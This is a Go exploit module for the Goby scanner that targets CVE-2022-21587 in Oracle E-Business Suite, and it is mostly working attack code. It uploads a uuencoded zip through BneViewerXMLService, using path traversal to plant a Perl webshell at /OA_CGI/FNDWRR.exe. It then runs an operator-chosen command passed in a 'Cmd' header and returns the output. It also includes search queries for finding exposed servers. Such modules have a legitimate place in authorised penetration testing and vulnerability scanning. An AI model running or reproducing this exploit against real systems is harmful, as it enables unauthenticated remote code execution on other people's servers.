package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Oracle E-Business Suite BneViewerXMLService Arbitrary File Upload Vulnerability (CVE-2022-21587)",
    "Description": "<p>Oracle E-Business Suite (E-Business Suite) is a set of fully integrated global business management software from Oracle Corporation. The software provides functions such as customer relationship management, service management, and financial management.</p><p>A security vulnerability exists in Oracle Web Applications Desktop Integrator versions 12.2.3-12.2.11 of Oracle E-Business Suite. An unauthenticated attacker gains server privileges by uploading a malicious webshell file.</p>",
    "Product": "Oracle-E-Business-Suite",
    "Homepage": "https://www.oracle.com/11",
    "DisclosureDate": "2023-01-20",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"OA_HTML/AppsLogin\" || header=\"OA_HTML/AppsLogin\" || banner=\"OA_HTML/AppsLogin\" || title=\"E-Business Suite Home Page Redirect\"",
    "GobyQuery": "body=\"OA_HTML/AppsLogin\" || header=\"OA_HTML/AppsLogin\" || banner=\"OA_HTML/AppsLogin\" || title=\"E-Business Suite Home Page Redirect\"",
    "Level": "3",
    "Impact": "<p>A security vulnerability exists in Oracle Web Applications Desktop Integrator versions 12.2.3-12.2.11 of Oracle E-Business Suite. An unauthenticated attacker gains server privileges by uploading a malicious webshell file.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.oracle.com/security-alerts/cpuoct2022.html\">https://www.oracle.com/security-alerts/cpuoct2022.html</a></p>",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/pull/6571/files"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2022-21587"
    ],
    "CNNVD": [
        "CNNVD-202210-1279"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Oracle E-Business Suite 软件 BneViewerXMLService 任意文件上传漏洞（CVE-2022-21587）",
            "Product": "Oracle-E-Business-Suite",
            "Description": "<p>Oracle E-Business Suite（电子商务套件）是美国甲骨文（Oracle）公司的一套全面集成式的全球业务管理软件。该软件提供了客户关系管理、服务管理、财务管理等功能。<br></p><p>Oracle E-Business Suite 的 Oracle Web Applications Desktop Integrator 12.2.3-12.2.11 版本存在安全漏洞。未经身份验证的攻击者通过上传恶意的webshell文件，获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.oracle.com/security-alerts/cpuoct2022.html\">https://www.oracle.com/security-alerts/cpuoct2022.html</a><br></p>",
            "Impact": "<p>Oracle E-Business Suite 的 Oracle Web Applications Desktop Integrator 12.2.3-12.2.11 版本存在安全漏洞。未经身份验证的攻击者通过上传恶意的webshell文件，获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Oracle E-Business Suite BneViewerXMLService Arbitrary File Upload Vulnerability (CVE-2022-21587)",
            "Product": "Oracle-E-Business-Suite",
            "Description": "<p>Oracle E-Business Suite (E-Business Suite) is a set of fully integrated global business management software from Oracle Corporation. The software provides functions such as customer relationship management, service management, and financial management.<br></p><p>A security vulnerability exists in Oracle Web Applications Desktop Integrator versions 12.2.3-12.2.11 of Oracle E-Business Suite. An unauthenticated attacker gains server privileges by uploading a malicious webshell file.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.oracle.com/security-alerts/cpuoct2022.html\">https://www.oracle.com/security-alerts/cpuoct2022.html</a><br></p>",
            "Impact": "<p>A security vulnerability exists in Oracle Web Applications Desktop Integrator versions 12.2.3-12.2.11 of Oracle E-Business Suite. An unauthenticated attacker gains server privileges by uploading a malicious webshell file.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv")
			cfg.Data = "------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"bne:uueupload\"\r\n\r\nTRUE\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"uploadfilename\";filename=\"testzuue.zip\"\r\n\r\nbegin 664 test.zip\r\nM4$L#!!0``````\"]P-%;HR5LG>@```'H```!#````+BXO+BXO+BXO+BXO+BXO\r\nM1DU77TAO;64O3W)A8VQE7T5\"4RUA<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.\r\nM1%=24BYP;'5S92!#1TD[\"G!R:6YT($-'23HZ:&5A9&5R*\"`M='EP92`]/B`G\r\nM=&5X=\"]P;&%I;B<@*3L*;7D@)&-M9\"`](\")E8VAO($YU8VQE:2U#5D4M,C`R\r\nM,BTR,34X-R([\"G!R:6YT('-Y<W1E;2@D8VUD*3L*97AI=\"`P.PH*4$L!`A0#\r\nM%```````+W`T5NC)6R=Z````>@```$,``````````````+2!`````\"XN+RXN\r\nM+RXN+RXN+RXN+T9-5U](;VUE+T]R86-L95]%0E,M87!P,2]C;VUM;VXO<V-R\r\nG:7!T<R]T>&M&3D174E(N<&Q02P4&``````$``0!Q````VP``````\r\n`\r\nend\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv--\r\n"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				uri2 := "/OA_CGI/FNDWRR.exe"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := "/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE"
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv")
					cfg3.Data = "------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"bne:uueupload\"\r\n\r\nTRUE\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"uploadfilename\";filename=\"testzuue.zip\"\r\n\r\nbegin 664 test.zip\r\nM4$L#!!0``````&UP-%:3!M<R`0````$```!#````+BXO+BXO+BXO+BXO+BXO\r\nM1DU77TAO;64O3W)A8VQE7T5\"4RUA<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.\r\nM1%=24BYP;`I02P$\"%`,4``````!M<#16DP;7,@$````!````0P``````````\r\nM````M($`````+BXO+BXO+BXO+BXO+BXO1DU77TAO;64O3W)A8VQE7T5\"4RUA\r\nM<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.1%=24BYP;%!+!08``````0`!`'$`\r\n(``!B````````\r\n`\r\nend\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv--\r\n"
					if _, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "Nuclei-CVE-2022-21587")
					}

				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv")
			cfg.Data = "------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"bne:uueupload\"\r\n\r\nTRUE\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"uploadfilename\";filename=\"testzuue.zip\"\r\n\r\nbegin 664 test.zip\r\nM4$L#!!0``````)QQ/%8&2`KJ<0```'$```!#````+BXO+BXO+BXO+BXO+BXO\r\nM1DU77TAO;64O3W)A8VQE7T5\"4RUA<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.\r\nM1%=24BYP;'5S92!#1TD[\"G!R:6YT($-'23HZ:&5A9&5R*\"`M='EP92`]/B`G\r\nM=&5X=\"]P;&%I;B<@*3L*;7D@)&-M9\"`]($-'23HZ:'1T<\"@G2%144%]#340G\r\nM*3L*<')I;G0@<WES=&5M*\"1C;60I.PIE>&ET(#`[4$L!`A0#%```````G'$\\\r\nM5@9(\"NIQ````<0```$,``````````````*2!`````\"XN+RXN+RXN+RXN+RXN\r\nM+T9-5U](;VUE+T]R86-L95]%0E,M87!P,2]C;VUM;VXO<V-R:7!T<R]T>&M&\r\n>3D174E(N<&Q02P4&``````$``0!Q````T@``````\r\n`\r\nend\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv--\r\n"
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				uri2 := "/OA_CGI/FNDWRR.exe"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cmd",cmd)
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					uri3 := "/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE"
					cfg3 := httpclient.NewPostRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryZsMro0UsAQYLDZGv")
					cfg3.Data = "------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"bne:uueupload\"\r\n\r\nTRUE\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv\r\nContent-Disposition: form-data; name=\"uploadfilename\";filename=\"testzuue.zip\"\r\n\r\nbegin 664 test.zip\r\nM4$L#!!0``````&UP-%:3!M<R`0````$```!#````+BXO+BXO+BXO+BXO+BXO\r\nM1DU77TAO;64O3W)A8VQE7T5\"4RUA<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.\r\nM1%=24BYP;`I02P$\"%`,4``````!M<#16DP;7,@$````!````0P``````````\r\nM````M($`````+BXO+BXO+BXO+BXO+BXO1DU77TAO;64O3W)A8VQE7T5\"4RUA\r\nM<'`Q+V-O;6UO;B]S8W)I<'1S+W1X:T9.1%=24BYP;%!+!08``````0`!`'$`\r\n(``!B````````\r\n`\r\nend\r\n------WebKitFormBoundaryZsMro0UsAQYLDZGv--\r\n"
					if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}

				}
			}
			return expResult
		},
	))
}